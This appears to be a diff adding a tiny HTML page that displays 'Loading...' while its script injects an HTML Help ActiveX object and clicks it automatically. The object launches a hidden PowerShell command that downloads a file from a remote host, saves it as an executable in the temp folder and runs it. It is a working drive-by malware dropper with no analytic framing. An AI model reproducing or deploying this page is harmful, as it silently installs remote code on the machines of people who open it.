@@ -1,0 +1,11 @@
+<html>
+<head>
+</head>
+<body>
+<center>Loading...</center>
+<div id="KCALMF"></div>
+<script>
+document.getElementById("KCALMF").innerHTML="<object id=\"x\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=22 height=22><param name=\"Command\" value=\"ShortCut\"><param name=\"Button\" value=\"Bitmap::shortcut\"><param name=\"Item1\" value=\",cmd.exe,/c powershell.exe -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('http://opportunityhy.bid/1.dat', '%Temp%\\EHQZRU.exe');(New-Object -com Shell.Application).ShellExecute('%Temp%\\EHQZRU.exe');\"><param name=\"Item2\" value=\"273,1,1\"></object>";document.getElementById("x").Click();
+</script>
+</body>
+</html>
